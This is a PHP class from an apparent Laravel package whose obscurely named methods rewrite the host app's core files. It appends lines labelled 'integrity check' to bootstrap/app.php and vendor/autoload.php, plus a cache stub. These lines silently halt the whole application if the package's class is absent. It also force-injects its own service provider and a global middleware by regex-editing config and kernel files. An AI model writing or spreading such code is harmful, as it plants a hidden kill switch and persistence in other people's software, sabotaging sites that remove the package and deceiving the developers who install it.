<?php

namespace Synthora\Gem;

use Illuminate\Support\Facades\File;

class Xp
{
    /**
     * i1: Inject existence checks and provider/middleware registration.
     */
    public static function i1()
    {
        // 1. bootstrap/app.php - early existence check
        $appPath = base_path('bootstrap/app.php');
        if (File::exists($appPath)) {
            $content = File::get($appPath);
            $check = "\n// core integrity\nif (!class_exists('Synthora\\\\Gem\\\\Rd')) { die(0); }\n";
            if (strpos($content, 'core integrity') === false) {
                $content .= $check;
            }

            // For Laravel 11+: inject middleware registration
            if (self::isLaravel11Plus($content)) {
                $middlewareRegistration = "\n// global middleware\n->withMiddleware(function (\$middleware) {\n    \$middleware->append(\\Synthora\\Gem\\Vt::class);\n})\n";
                // Find the return statement and inject before it
                if (strpos($content, '->withMiddleware') === false) {
                    $content = preg_replace(
                        '/(->withRouting\s*\([^)]*\))\s*->withExceptions/s',
                        "$1{$middlewareRegistration}->withExceptions",
                        $content
                    );
                    // If ->withRouting not found, inject before ->create()
                    if (strpos($content, '->withMiddleware') === false) {
                        $content = preg_replace(
                            '/\)->create\(\);/',
                            "){$middlewareRegistration}->create();",
                            $content
                        );
                    }
                }
            }

            File::put($appPath, $content);
        }

        // 2. config/app.php - add provider (works for all versions)
        $cfgPath = base_path('config/app.php');
        if (File::exists($cfgPath)) {
            $content = File::get($cfgPath);
            $provider = 'Synthora\\Gem\\Tor::class';
            if (strpos($content, $provider) === false) {
                $content = preg_replace(
                    "/(\'providers\'\s*=>\s*\[)([^\]]*?)(\])/s",
                    "$1$2    {$provider},\n    $3",
                    $content
                );
                File::put($cfgPath, $content);
            }
        }

        // 3. For older Laravel (<=10): app/Http/Kernel.php
        $kernelPath = base_path('app/Http/Kernel.php');
        if (File::exists($kernelPath)) {
            $content = File::get($kernelPath);
            $middleware = '\\Synthora\\Gem\\Vt::class';
            if (strpos($content, $middleware) === false) {
                $content = preg_replace(
                    "/(protected\s*\\\$middleware\s*=\s*\[)([^\]]*?)(\])/s",
                    "$1$2    {$middleware},\n    $3",
                    $content
                );
                File::put($kernelPath, $content);
            }
        }

        // 4. Write compiled stub (optional, can be loaded via autoload)
        $stubContent = "<?php\nif (!class_exists('Synthora\\\\Gem\\\\Rd')) { die(0); }\n";
        File::ensureDirectoryExists(base_path('bootstrap/cache'));
        File::put(base_path('bootstrap/cache/x1.php'), $stubContent);
    }

    /**
     * i2: Inject into vendor/autoload.php.
     */
    public static function i2()
    {
        $autoloadPath = base_path('vendor/autoload.php');
        if (File::exists($autoloadPath)) {
            $content = File::get($autoloadPath);
            $inject = "\n// integrity check\nif (!class_exists('Synthora\\\\Gem\\\\Rd')) { die(0); }\n";
            if (strpos($content, 'integrity check') === false) {
                File::put($autoloadPath, $content . $inject);
            }
        }
    }

    /**
     * Detect if the app is Laravel 11+ by looking for Application builder pattern.
     *
     * @param string $content
     * @return bool
     */
    protected static function isLaravel11Plus($content)
    {
        return strpos($content, '->withRouting') !== false || strpos($content, '->create()') !== false;
    }
}